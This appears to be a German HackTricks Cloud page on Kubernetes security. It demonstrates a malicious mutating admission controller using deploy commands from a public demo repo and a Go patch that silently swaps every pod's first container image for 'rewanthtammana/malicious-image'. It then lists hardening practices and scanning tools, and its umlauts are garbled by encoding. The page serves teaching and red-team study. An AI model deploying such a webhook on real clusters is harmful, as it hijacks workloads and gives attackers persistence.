### B√∂sartiger Zulassungscontroller

Ein Zulassungscontroller **interceptiert Anfragen an den Kubernetes-API-Server** vor der Persistenz des Objekts, aber **nachdem die Anfrage authentifiziert** **und autorisiert** wurde.

Wenn ein Angreifer es irgendwie schafft, **einen Mutationg-Zulassungscontroller einzuschleusen**, wird er in der Lage sein, **bereits authentifizierte Anfragen zu modifizieren**. Dies k√∂nnte potenziell zu Privilegienerweiterung f√ºhren und h√§ufiger im Cluster bestehen bleiben.

**Beispiel von** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
√úberpr√ºfen Sie den Status, um zu sehen, ob es bereit ist:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Dann bereitstellen eines neuen Pods:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Wenn Sie den Fehler `ErrImagePull` sehen, √ºberpr√ºfen Sie den Bildnamen mit einem der folgenden Abfragen:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![b√∂sartiger-zulassungscontroller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Wie Sie im obigen Bild sehen k√∂nnen, haben wir versucht, das Image `nginx` auszuf√ºhren, aber das letztendlich ausgef√ºhrte Image ist `rewanthtammana/malicious-image`. Was ist gerade passiert!!?

#### Technische Details <a href="#heading-technicalities" id="heading-technicalities"></a>

Das `./deploy.sh` Skript richtet einen mutierenden Webhook-Zulassungscontroller ein, der Anfragen an die Kubernetes-API gem√§√ü den in seinen Konfigurationszeilen angegebenen √Ñnderungen modifiziert und somit die beobachteten Ergebnisse beeinflusst:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
Der obige Auszug ersetzt das erste Container-Image in jedem Pod durch `rewanthtammana/malicious-image`.

## OPA Gatekeeper Umgehung

{% content-ref url="../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md" %}
[kubernetes-opa-gatekeeper-bypass.md](../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md)
{% endcontent-ref %}

## Best Practices

### **Deaktivierung des automatischen Einbindens von Service Account Tokens**

* **Pods und Service Accounts**: Standardm√§√üig binden Pods ein Service Account Token ein. Um die Sicherheit zu erh√∂hen, erlaubt Kubernetes die Deaktivierung dieses automatischen Einbindens.
* **Anwendung**: Setzen Sie `automountServiceAccountToken: false` in der Konfiguration von Service Accounts oder Pods ab Kubernetes Version 1.6.

### **Einschr√§nkende Benutzerzuweisung in RoleBindings/ClusterRoleBindings**

* **Selektive Einbindung**: Stellen Sie sicher, dass nur notwendige Benutzer in RoleBindings oder ClusterRoleBindings enthalten sind. √úberpr√ºfen Sie regelm√§√üig und entfernen Sie irrelevante Benutzer, um die Sicherheit zu gew√§hrleisten.

### **Namespace-spezifische Rollen √ºber Cluster-weite Rollen**

* **Rollen vs. ClusterRoles**: Verwenden Sie bevorzugt Rollen und RoleBindings f√ºr namespace-spezifische Berechtigungen anstelle von ClusterRoles und ClusterRoleBindings, die clusterweit gelten. Dieser Ansatz bietet eine feinere Kontrolle und begrenzt den Umfang der Berechtigungen.

### **Verwenden Sie automatisierte Tools**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Referenzen**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Weitere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
